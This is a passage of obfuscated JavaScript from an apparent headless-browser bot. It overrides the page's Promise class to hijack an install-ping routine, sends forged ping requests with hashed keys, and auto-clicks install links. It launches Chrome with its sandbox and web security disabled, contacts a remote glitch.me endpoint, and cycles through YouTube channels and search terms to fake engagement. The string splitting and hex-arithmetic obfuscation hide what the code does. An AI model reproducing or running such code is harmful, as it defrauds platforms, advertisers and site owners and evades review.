                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1f68 + 0x6 * -0x4cf + -0x289 | L >>> -0xc09 * 0x3 + 0x24f * 0x3 + -0x99 * -0x31) + (M & N | ~M & O) + P + (-0xa2725d63 + 0x6d7b * 0x4553 + 0xaef * 0x146c95) + Q[J] << 0x77f + 0x1902 + 0x1 * -0x2081) << 0x1 * 0x23f1 + 0x55a * 0x5 + -0x3eae | P >>> 0xa * 0x3b + -0x1d6c + 0x1b39) + (L & (M = M << 0x25df + -0x2 * 0x5d3 + 0x29 * -0xa3 | M >>> 0x15b * -0xa + 0xec5 * 0x2 + -0x7fd * 0x2) | ~L & N) + O + (0x32e11ac1 + 0x1 * -0x1deb092e + 0x742 * 0x99523) + Q[J + (-0x2614 + -0x237a + 0x498f)] << -0x2155 + -0x1 * 0x11e7 + 0x1114 * 0x3) << -0x2 * -0xae0 + 0x1cdd + -0x3298 | O >>> -0x110a + -0x23bc + 0x1 * 0x34e1) + (P & (L = L << 0x11 * -0x16 + 0x2415 + -0x2281 | L >>> 0x37c * -0x6 + 0x17f4 + -0x30a * 0x1) | ~P & M) + N + (0x25f * -0x3fb73d + -0x31518e69 + 0x122e781a5) + Q[J + (-0x2248 + -0x9fe + 0x2c48)] << -0xa4 * -0x25 + -0x1703 + -0xb1 * 0x1) << 0x1f0e + -0x1069 * -0x1 + -0x2f72 | N >>> 0x12f6 + -0xf52 + -0x389) + (O & (P = P << -0x2121 + 0x8e3 * 0x1 + -0x4 * -0x617 | P >>> 0x5 * 0x2f3 + -0x1e25 * -0x1 + -0x77b * 0x6) | ~O & L) + M + (-0x6cc2e127 + -0x1b324f7 * -0x5d + 0x2930ed05) + Q[J + (-0x8 * 0x1c1 + 0x1054 + -0x249)] << 0xca * -0x20 + -0x629 + 0x1f69 * 0x1) << -0x2093 + -0x375 + 0x347 * 0xb | M >>> -0x1 * -0x230b + 0x2305 + -0x45f5) + (N & (O = O << -0x2215 + -0xb * -0x2b4 + 0x477 | O >>> -0x46 * -0x4f + -0x1ab7 + 0x51f) | ~N & P) + L + (0x2e5f0a31 * -0x1 + 0x5 * 0x1d25641 + 0x109eeff * 0x7b) + Q[J + (-0x1eb0 + 0x215 * -0x9 + 0x107b * 0x3)] << 0x194f + -0xc99 * -0x3 + 0x3f1a * -0x1, N = N << 0x121a + -0x1a01 + 0x805 | N >>> 0x1aa8 + 0x23dd + -0x3e83;
              for (; J < 0x33 + 0x43 * 0x1f + 0x1 * -0x828; J += 0x3 * 0x5e7 + 0x1dd3 + 0x1 * -0x2f83)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x9fd + 0x3fb * -0x4 + -0x19ee * -0x1 | L >>> -0x1 * 0xee + 0x804 + 0x1 * -0x6fb) + (M ^ N ^ O) + P + (0xc * 0xef7690b + 0x2 * -0x52d2e3c0 + 0x1 * 0x60e6c69d) + Q[J] << -0xe24 + 0x102c + -0x208) << -0x12f5 * -0x1 + 0xa93 * 0x2 + 0x1 * -0x2816 | P >>> 0x26c1 * 0x1 + -0x3 * 0x32b + -0x1d25) + (L ^ (M = M << 0x1 * 0x1ebb + 0x3 * 0x1bf + 0x23da * -0x1 | M >>> 0x1fac + 0x1 * -0x24af + 0x505) ^ N) + O + (-0xc0357963 + -0x824840f2 * 0x1 + 0x1b157a5f6) + Q[J + (-0xbe + -0x2604 + 0x26c3)] << 0x2 * 0xd12 + 0x5b4 + 0x2 * -0xfec) << 0x1868 + -0x1471 + -0x3f2 | O >>> -0x2 * 0x270 + 0xef * 0x1 + 0x40c) + (P ^ (L = L << 0x30 * 0x49 + -0x1 * 0x1ac7 + 0xd35 | L >>> 0x26b * 0x7 + 0x1ca9 + -0x2d94) ^ M) + N + (-0xcbb751d2 + -0x1cf * -0x4e00d6 + -0x9e3 * -0x118c43) + Q[J + (-0x1d29 + -0x1 * -0x1ec7 + -0x19c)] << 0x1 * 0x561 + 0x929 + -0x1 * 0xe8a) << 0x14eb + 0x247a + -0xd8 * 0x44 | N >>> -0x1 * -0x1f60 + 0x587 * -0x1 + 0xa * -0x293) + (O ^ (P = P << -0x94f + 0x2 * -0x745 + 0x7fd * 0x3 | P >>> -0x8e1 * 0x1 + -0x1e80 + 0x2763) ^ L) + M + (-0x3 * -0x209279d5 + -0x8c851627 + 0x99a79449) + Q[J + (-0x1 * 0xb2 + 0x252a + 0x3 * -0xc27)] << -0xd5e + -0x2129 + 0x2e87) << 0x13dd + -0x2232 + 0xe5a | M >>> 0x113b * 0x1 + 0x31d * -0x3 + -0x7c9) + (N ^ (O = O << 0x1 * 0x2d1 + 0x151 * 0x13 + -0x1 * 0x1bb6 | O >>> 0x1b * 0x13a + -0x827 * 0x4 + -0x80) ^ P) + L + (-0xd549c114 + -0x4b57cbbd + 0x2a * 0x982f095) + Q[J + (0x63b + -0x1c44 + 0x160d)] << 0x83f + -0x2263 + -0x689 * -0x4, N = N << 0x189 * -0x2 + 0x1194 + -0x399 * 0x4 | N >>> 0x2349 + 0x15f7 + 0x1c9f * -0x2;
              for (; J < -0xe5b + -0x1af + 0x1046; J += -0xe78 + -0xb3 * 0x1b + 0x1 * 0x215e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xff * -0x5 + 0x1610 + -0x1110 | L >>> -0xb * -0x7f + -0x2257 + -0xb5 * -0x29) + (M & N | M & O | N & O) + P - (-0xdfa29fa6 + -0xb6957d52 + 0x16c * 0x16d16c5) + Q[J] << -0x24f9 + 0x3 * -0x4ed + -0x90 * -0x5c) << 0x260f * 0x1 + -0x117 + -0x24f3 | P >>> -0x18b7 + 0x1 * -0x1b69 + 0x1169 * 0x3) + (L & (M = M << 0x180 + 0x2a5 + -0x407 | M >>> 0x1 * 0x1669 + -0xe29 + -0x83e) | L & N | M & N) + O - (-0x3cb6b037 + 0x7c1d0e3b + -0x4f2fd5 * -0xa0) + Q[J + (0x1 * 0x647 + -0x79 * -0x2 + -0x16 * 0x54)] << -0xb18 + -0xd3a * -0x1 + -0x222) << 0xd5 * 0x13 + 0x210 + -0x11da | O >>> 0x5f7 * -0x6 + -0x264a + 0x4a2f) + (P & (L = L << 0xd1 * 0x17 + -0xe89 + -0x420 | L >>> -0x2651 + 0xb3f + -0x1 * -0x1b14) | P & M | L & M) + N - (-0xe * -0xdf659ee + 0xb2bdf036 + 0x1 * -0x105529816) + Q[J + (0x166b + 0x1 * -0x1e5c + -0x25 * -0x37)] << 0x15d * -0x7 + -0xfc7 + -0x2 * -0xca9) << 0xb25 * 0x3 + -0x68e + -0x4 * 0x6b7 | N >>> 0x2f * -0x4f + 0xc52 * -0x2 + 0x2740) + (O & (P = P << 0x1656 + -0x159d * -0x1 + -0x2bd5 | P >>> 0x2559 + -0x2d * -0x2f + -0x1a * 0x1c1) | O & L | P & L) + M - (0x60249154 * 0x1 + 0x2bf35ff * -0x4c + -0x1 * -0xe183b984) + Q[J + (0x2 * -0x317 + 0x14b6 + -0xe85)] << 0x1fb3 + -0x167b + 0x24e * -0x4) << -0x2090 + 0x7 * 0x2c2 + 0xd47 | M >>> -0x216c + 0x52 * 0x10 + -0x1 * -0x1c67) + (N & (O = O << -0x172e + 0x176e + -0x22 | O >>> -0x4ee * -0x1 + -0xf * 0x17f + 0x1185) | N & P | O & P) + L - (0x5c6b41e9 * -0x1 + -0x567a * -0xf92 + 0xc80d0d79) + Q[J + (-0xd * 0x16f + 0x57 * 0x47 + -0x2bd * 0x2)] << 0x250c * -0x1 + -0x3 * 0x10 + 0x253c, N = N << 0x44 * 0xa + -0xd23 + 0xa99 | N >>> -0x1645 + 0x1d46 + -0x1 * 0x6ff;
              for (; J < -0xb1d + -0x9f0 + -0x3 * -0x71f; J += 0x1 * 0x12d9 + -0xc05 + -0x6cf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x417 + 0x8fb * 0x4 + -0x10 * 0x1fd | L >>> -0xf4c + -0x1aaa + 0x2a11) + (M ^ N ^ O) + P - (0x1bffd644 + -0x5c195d32 * 0x1 + -0x67f * -0x121ee8) + Q[J] << -0x2506 + 0x1f75 * 0x1 + 0x13 * 0x4b) << -0xb * -0x2a9 + 0xef1 + -0x1 * 0x2c2f | P >>> -0x1 * -0x240b + -0x1d16 + -0x6da * 0x1) + (L ^ (M = M << 0x17ff * 0x1 + 0x25 * 0xf5 + 0x1 * -0x3b4a | M >>> -0x1 * -0x200d + -0x8db * -0x1 + -0x82e * 0x5) ^ N) + O - (0x1 * 0x5c900e07 + 0x12 * 0x549f753 + -0x862633b3) + Q[J + (-0x5 * -0x461 + 0x3 * 0xcae + -0x3bee)] << -0x1e79 + -0x267d + 0x44f6) << -0x1472 + 0x101 * 0xe + 0x3 * 0x223 | O >>> 0xb * -0x18c + 0x1e4 * -0x3 + 0x16cb) + (P ^ (L = L << 0x150a + -0x4eb * -0x7 + -0x3759 | L >>> 0x2461 + 0x392 + -0x27f1) ^ M) + N - (-0x2671fb8 + 0x10935d * -0x238 + -0xf4e67a * -0x61) + Q[J + (-0x2110 + -0x4 * 0x4d2 + 0x345a * 0x1)] << 0x9 * 0x3f + -0x147e + 0x1 * 0x1247) << 0x26d5 + 0x19b6 + -0x4086 | N >>> -0xdef + -0x68b * 0x3 + 0x21ab) + (O ^ (P = P << -0x23f1 + 0x67 * 0x1d + 0x1864 | P >>> 0xac1 + 0x27 * 0xb6 + -0x2679) ^ L) + M - (-0x259802db + 0x4bec7b7 + 0x1 * 0x5676794e) + Q[J + (0xb5 * -0x17 + 0x1 * 0x397 + 0xcaf * 0x1)] << -0xe3b + -0x4 * -0x871 + -0x1389) << -0x24a8 + -0xe35 * 0x2 + 0x4117 | M >>> -0x105 * -0x11 + -0x18 * -0xd3 + 0x2 * -0x1281) + (N ^ (O = O << 0x3 * 0x311 + -0x153f + 0xc2a | O >>> -0x1143 + -0x25c4 + 0x3709) ^ P) + L - (0x216d7682 + 0x439e5b5 * -0x17 + 0x75636aeb * 0x1) + Q[J + (0x3 * -0x8cd + -0x1 * -0x1eb + 0x1880)] << 0x19c4 + 0xece + 0x9 * -0x482, N = N << -0x45c + 0x2 * 0x11b + 0x244 | N >>> 0xc5 * -0x4 + -0x1a2b + 0x1d41;
              this['h0'] = this['h0'] + L << -0x20e6 + -0x961 + 0x2a47, this['h1'] = this['h1'] + M << -0x1 * 0x10ed + 0x733 + 0x3 * 0x33e, this['h2'] = this['h2'] + N << 0x2512 + 0x3 * 0x3c7 + -0x1 * 0x3067, this['h3'] = this['h3'] + O << -0x1c13 + -0x11e0 + -0xf51 * -0x3, this['h4'] = this['h4'] + P << -0x5c * 0x5a + 0x2545 + -0x61 * 0xd;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x10fd * 0x1 + -0x1780 + 0x223 * 0x13 & -0x27 * -0x9 + -0x2697 + 0x2547] + w[J >> 0x1fd + 0x173 + -0x358 & 0xe * 0xe6 + -0x2485 + 0x1800] + w[J >> 0x32 * 0x9f + -0x101 * 0x25 + 0x62b & -0x2332 + -0x1fd3 + 0x4314] + w[J >> 0x2e7 * 0x3 + -0x1c9c + 0x13f7 & -0x4 * 0x312 + -0x9ef + 0x1646] + w[J >> 0x26 * -0xc6 + -0x1 * 0x127b + 0x2feb & 0xb37 + 0x1137 * 0x1 + 0x975 * -0x3] + w[J >> 0x2e * -0x12 + -0x10df * 0x2 + 0x2502 & 0x22 * 0x11 + -0x1504 + 0x12d1 * 0x1] + w[J >> -0x83 * 0x7 + -0x12 * -0xbd + 0x3 * -0x33b & -0x539 + -0x170 * -0xb + -0xa88] + w[0x50f + 0x2237 + -0x2737 * 0x1 & J] + w[K >> -0xc * -0x255 + 0xc27 + -0x2807 * 0x1 & -0x211a + -0x1087 + 0x31b0] + w[K >> 0x1fcc + -0x199 + -0x16f * 0x15 & 0x1607 + -0x2 * 0xd87 + 0xd9 * 0x6] + w[K >> 0x2cb * -0x2 + -0x656 + 0x40 * 0x30 & 0x1247 * 0x2 + 0x777 + -0x2 * 0x15fb] + w[K >> 0xa4a * -0x1 + -0x1 * -0x120e + -0x7b4 & 0x24a9 + -0x1858 + 0x3 * -0x416] + w[K >> 0x1c7e + -0xc * 0x28e + 0x236 * 0x1 & 0x1 * 0xebc + -0x22e4 + 0x1437] + w[K >> 0x1 * -0x419 + -0x25f5 + 0x2a16 & 0x221b + -0xecf + -0x19 * 0xc5] + w[K >> 0x371 * -0x1 + -0x1b85 + -0x5 * -0x632 & -0xad * 0x8 + 0x4 * -0x8c7 + -0x2f * -0xdd] + w[0xf98 + 0x9e * 0x21 + -0x23e7 & K] + w[L >> 0x9ea + 0x1cb * -0x10 + -0x12e2 * -0x1 & -0x7 * 0x54a + 0x1b25 * -0x1 + -0x1 * -0x403a] + w[L >> 0x1a4b + -0x10ff + 0x26 * -0x3e & -0x19d7 + 0x2 * -0x32b + 0x203c] + w[L >> 0x11e1 + -0x169 + -0x1064 & 0x1 * -0x420 + 0x1 * 0x24d2 + -0x20a3] + w[L >> -0xd2c + -0xc16 + 0x1952 & 0x49 * 0x47 + -0x39e + -0x1092] + w[L >> -0x18ef + 0x6 * 0x1f5 + 0xd3d & -0x4 + 0x1265 * 0x1 + -0x1252] + w[L >> 0x455 * 0x3 + -0x1204 + -0x3 * -0x1af & -0x2 * 0x1203 + 0x1 * -0x143d + 0x12c6 * 0x3] + w[L >> 0x4d * -0xb + -0x4d + 0x3a0 & 0xa4d + 0xba8 + -0x15e6] + w[0x88a * -0x1 + 0x167 * 0x6 + -0x2f * -0x1 & L] + w[M >> -0x25f1 + -0x1f * 0x11b + 0x4852 & 0xc4f + 0x1 * -0x11bd + 0x57d] + w[M >> 0x1735 + 0x5 * 0x743 + -0x3b6c & 0x2dd * 0x8 + -0xc * 0x24b + 0x4ab] + w[M >> -0x704 + -0xa * -0x75 + 0x286 & -0x974 + 0xc9a + -0x1 * 0x317] + w[M >> 0x549 * -0x2 + -0x2f * -0x79 + 0x5 * -0x251 & 0x18 * -0x5c + 0x1e26 * 0x1 + -0x5 * 0x44b] + w[M >> 0x1 * 0x76e + -0xe2 + -0x340 * 0x2 & -0x4b * 0x5 + 0x8f1 + -0x76b] + w[M >> 0x1d * -0xe2 + 0x1728 + 0x13d * 0x2 & -0x1 * 0x26f7 + -0x5c * 0x25 + -0x3452 * -0x1] + w[M >> -0x14 + -0x31 * 0x3b + 0x35 * 0x37 & -0x16f6 * -0x1 + 0x6d * 0x25 + -0x26a8 * 0x1] + w[-0x109 * 0x5 + 0x15ba * 0x1 + 0x1 * -0x107e & M] + w[N >> -0x612 + -0x24 * 0x8 + -0x16 * -0x55 & -0x14f5 + 0x4 * -0x11b + -0x8 * -0x32e] + w[N >> 0x2 * -0x61b + -0x8f6 + 0x1544 & 0xc39 + -0xd34 + 0x2 * 0x85] + w[N >> -0x157f + 0x11b * 0x1 + 0x14 * 0x106 & 0x7 * -0x3b + -0x119b * -0x1 + -0x1 * 0xfef] + w[N >> 0x1 * -0xa61 + -0x1 * -0x1f3c + 0x14cb * -0x1 & -0x1add + 0x48b + -0x11 * -0x151] + w[N >> -0x136d * -0x1 + 0x14aa + 0x3 * -0xd59 & -0x74d + -0x1 * 0x73d + 0xe99] + w[N >> -0xd5 * 0x22 + 0x21a2 + 0x5 * -0x110 & 0x1346 + 0x23b9 + -0x36f0] + w[N >> 0xf9 * 0x12 + -0x1 * -0x2293 + -0x3411 & 0x2039 + -0x1016 * -0x1 + -0x3040] + w[-0x2627 + 0x2c6 * 0x1 + -0x46e * -0x8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x241a * 0x1 + 0x17 * 0xe0 + 0x2 * 0x809 & 0xa * 0x15d + 0x4f * 0x4 + 0x43 * -0x35,
                J >> -0x1 * -0xad + 0x2521 + -0x25be & -0x11b3 + -0x5 * -0x577 + -0x8a1,
                J >> 0x190b + -0x22d1 * -0x1 + -0x3bd4 & 0x526 * -0x2 + -0x121a + 0xaf * 0x2b,
                0x1 * -0x1e49 + -0xc2f + 0x2b77 * 0x1 & J,
                K >> 0x74b * 0x1 + -0x1698 + 0xf65 & -0xb88 + 0xaed + 0x19a,
                K >> 0x2 * -0x7f4 + 0x1da4 * 0x1 + -0xdac & -0x319 + 0x146 * 0xb + -0x9ea,
                K >> -0x5b1 * -0x6 + 0x17dd + -0x39fb & 0x166f * 0x1 + -0x1c9e + 0x72e,
                0x1db1 + 0xf7a + -0x2c2c & K,
                L >> 0xcda + 0x2247 * 0x1 + -0x2f09 & 0x10c2 + -0xe05 + -0x1be,
                L >> -0x2021 + 0xfa5 + 0x108c & 0x233f + 0x3 * 0x7cf + 0x5 * -0xb89,
                L >> -0x2f8 + -0x1 * 0x2359 + 0x2659 & -0x1fe4 + 0x1 * -0x1a52 + 0x3b35,
                -0x3 * 0x2db + -0x22f0 + -0x1 * -0x2c80 & L,
                M >> 0x1306 * -0x1 + 0x1904 + -0x5 * 0x12e & -0x1 * -0x1c1e + 0x526 + -0xb * 0x2ef,
                M >> -0x507 + -0x36 * 0x54 + 0x16cf & -0x81 + 0x1d7a + -0x1 * 0x1bfa,
                M >> 0x5 * -0x6d6 + 0x25f2 + -0x3bc & 0x85a * 0x4 + 0x386 * -0xb + 0x659,
                -0xbe0 + 0xd7f + 0x1 * -0xa0 & M,
                N >> 0xad1 + 0xba + -0xb73 & -0x17 * -0xc9 + -0xfec + -0x124,
                N >> 0x143e + -0x72f + -0x455 * 0x3 & 0x1f9c + 0x1a47 + -0x38e4,
                N >> -0x22ca + -0x23af + 0x4681 & 0xa92 + -0x94f * 0x1 + -0x44,
                0x1 * 0xebf + 0x1ccd * 0x1 + 0xe2f * -0x3 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x58d + 0x1c1c + 0x1 * -0x167b), (K = new DataView(J))['setUint32'](0x10f1 * 0x1 + 0x1 * -0x95b + -0x796 * 0x1, this['h0']), K['setUint32'](-0xc33 + -0x61 * 0xd + 0x1124, this['h1']), K['setUint32'](0x1 * -0x2303 + 0x11 * -0x9c + 0x2d67, this['h2']), K['setUint32'](-0x569 * -0x4 + -0x1e6 * -0x3 + -0x1b4a, this['h3']), K['setUint32'](-0x1c33 + 0x84d + 0x13f6, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x21da * 0x1 + -0xc5 * 0x3 + -0x2429 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x15ab + -0x8e * -0x26 + -0x2abf;
            J[-0x88d * -0x4 + 0x1 * 0x695 + -0x28c9]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0x22a + 0x10ff * -0x1 + 0xed5] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xf87 + -0x1 * -0x127d + -0x2f5), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2646 + -0x127f + -0x13c6;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2509 + -0x1 * -0x1c63 + 0x4d6 * 0x3), Promise['resolve'](-0xc6 * -0x15 + -0x17e9 + 0x7ac);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0x2dd + -0x1d69 + 0x1b * 0x132; j < -0x397 + 0x134c + -0xfb4; j++)
    i();
}
const NETWORK_PATIENCE = -0x26e3 + -0x2 * 0x2b1 + 0x4b85 + (0x1 * 0x229d + 0x93 * 0x2 + -0x5 * 0x4cf) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x17ea * 0x1 + 0x28c * 0x2 + 0x12d5) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xed3 + 0x1aec * 0x1 + -0x29bf);
    let h = e[f];
    if (c['FiIVZw'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x18d + 0x5cf * 0x2 + -0xa11, r, s, t = 0x1d * -0x10f + 0x1f59 * -0x1 + -0x344 * -0x13; s = m['charAt'](t++); ~s && (r = q % (0xaaf * 0x1 + 0x7fb + -0x12a6) ? r * (0x1b5c * 0x1 + 0x6d2 + 0x21ee * -0x1) + s : s, q++ % (0x1c90 + -0x1d09 * 0x1 + 0x7d * 0x1)) ? o += String['fromCharCode'](-0x47 * 0x62 + -0x219f * 0x1 + 0x3dcc & r >> (-(0x112d + -0x223d + 0x1112) * q & 0x21af * 0x1 + -0x4ae * -0x8 + -0x4719)) : 0x1b * 0x9a + 0xa7b * -0x3 + 0x1 * 0xf33) {
          s = n['indexOf'](s);
        }
        for (let u = 0x11ba + 0xc86 + -0x1e40, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1f42 + 0x152d + 0x173 * 0x7))['slice'](-(0x563 + 0x1 * -0x95 + -0x4cc));
        }
        return decodeURIComponent(p);
      };
      c['vSAetz'] = i, b = arguments, c['FiIVZw'] = !![];
    }
    const j = e[0x3 * 0x817 + -0x1986 + 0x141],
      k = f + j,
      l = b[k];
    return !l ? (h = c['vSAetz'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2236 + 0x1 * 0x11a7 + -0x30d * 0x11; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + X(0x1) + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x3e2 * 0x3 + -0x1007 + 0x37 * 0x81)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1d3 * 0x13 + 0x1c24 + 0x49 * 0x17)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 